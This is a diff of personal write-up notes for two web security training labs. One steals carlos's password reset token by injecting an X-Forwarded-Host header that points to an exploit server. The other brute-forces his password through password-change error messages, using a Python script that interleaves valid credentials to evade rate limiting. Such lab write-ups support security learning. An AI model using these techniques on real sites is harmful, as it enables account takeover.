@@ -104,9 +104,103 @@
 //Lab -- password reset poisoning via middleware
 
 
+- log in with `wiener : peter`
+- check our email for our exploit server -- `wiener@exploit-0ac900a503d5471c80df709101f000bb.exploit-server.net`
+- log out and click on the `forgot password` endpoint
+- try and reset our password -- got a link in our email -- click on the link -- confirmed that we can successfully reset our password
+- now on repeater -- try and add `X-Forwarded-Host: https://exploit-0ac900a503d5471c80df709101f000bb.exploit-server.net` to the request header of `/forgot-password` endpoint
+- also use `carlos` as value in the username param
+
+<img width="1248" height="406" alt="image" src="https://github.com/user-attachments/assets/b8e6c0b9-f553-4404-93d9-f2b250448b1c" />
 
 
-wiener@exploit-0ac900a503d5471c80df709101f000bb.exploit-server.net
+- check our log in the exploit server and find the password reset token for carlos
+
+<img width="1286" height="93" alt="image" src="https://github.com/user-attachments/assets/cc317e0e-01e2-4b0e-b5ec-de335822dce6" />
+
+- now send the `/forgot-password?temp-forgot-password-token=<token>` endpoint where we actually reset password to repeater
+- swap in the stolen token we got just now for carlos both in the request body and the actual query string up top
+- also change the password param to our newly chosen password `tools` -- send it
+
+<img width="1247" height="436" alt="image" src="https://github.com/user-attachments/assets/a34921d5-feb4-4e5c-ba01-ada105d1245a" />
+
+- now try and log in with our new creds `carlos : tools`
+- and lab solved
+
+<img width="1211" height="665" alt="image" src="https://github.com/user-attachments/assets/ffa6e346-373c-438f-9653-8405982bcc3f" />
+
+** LESSON LEARNED
+- always try the `x-forwarded-host` header!
+
+---
+
+<img width="1042" height="282" alt="image" src="https://github.com/user-attachments/assets/1accfa8a-cacd-4315-a052-7a36e6624659" />
+
+
+//Lab: Password brute-force via password change
+
+- log in with `wiener : peter`
+- try and change new password
+- in repeater, experiment around and observe that invalid creds would cause 'current password is incorrect error'
+- however, if we use valid creds but with 2 different new passwords -- we get 'new passwords do not match' error
+- which we can use to identify carlos' password
+
+<img width="1251" height="411" alt="image" src="https://github.com/user-attachments/assets/4e82edf4-e20b-4610-aaec-5590472cc5f3" />
+
+- send request to intruder
+- set pitchfork attack
+- set up 2 payloads
+- NOTE that we need for every third request to be correct credentials to prevent rate limiting and potential IP ban
+- first payload for username param
+- to create username-wordlist `python3 -c "for _ in range(50): print('carlos\ncarlos\nwiener')"`
+
+<img width="450" height="457" alt="image" src="https://github.com/user-attachments/assets/47f29eaa-ed92-427a-bc85-75767413062a" />
+
+- second payload for current-password param
+- to create password-wordlist
+```
+with open("wordlist.txt") as f:
+    words = [line.strip() for line in f]
+
+interleaved = []
+for i, word in enumerate(words):
+    interleaved.append(word)
+    if (i + 1) % 2 == 0:  # After every 2 candidate passwords, insert valid password
+        interleaved.append("peter")
+
+with open("interleaved_passwords.txt", "w") as f:
+    f.write("\n".join(interleaved))
+
+```
+
+<img width="449" height="451" alt="image" src="https://github.com/user-attachments/assets/d3032413-6d7d-46f3-b572-58d94e63b07b" />
+
+
+- now make sure that the two new passwords params have different values -- to trigger `new passwords do not match` error
+
+<img width="1552" height="443" alt="image" src="https://github.com/user-attachments/assets/c0cff5f7-0607-4097-8403-cd6dd8ad2f1a" />
+
+
+- start the attack and after a few seconds, we found a potential match `carlos : master`
+
+<img width="1173" height="770" alt="image" src="https://github.com/user-attachments/assets/73fb3731-cc31-410a-a13f-178f62252ceb" />
+
+
+- log in as `carlos : master`
+- lab solved
+
+<img width="1050" height="446" alt="image" src="https://github.com/user-attachments/assets/134c81e9-4cb3-47c5-a883-6425a5712081" />
+
+
+
+
+
+
+
+
+
+
+
 
 
 
